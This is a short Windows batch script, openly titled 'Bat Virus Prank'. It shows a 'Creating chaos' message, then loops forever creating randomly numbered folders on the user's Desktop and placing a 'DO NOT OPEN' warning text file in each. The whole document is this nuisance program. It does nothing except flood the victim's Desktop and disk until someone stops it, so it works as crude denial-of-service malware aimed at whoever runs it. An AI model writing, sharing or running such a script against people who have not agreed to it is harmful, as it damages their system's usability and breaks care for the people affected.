@echo off
color 04
title Bat Virus Prank
echo Prank Started! Creating chaos...

:: Infinite loop creating folders
:loop
set /a num=%random% %%9999
mkdir "%USERPROFILE%\Desktop\macro-12.0-%num%"
echo WARNING! DO NOT OPEN THIS FILE! > "%USERPROFILE%\Desktop\macro-12.0-%num%\DON'T.OPENME.txt"
goto loop
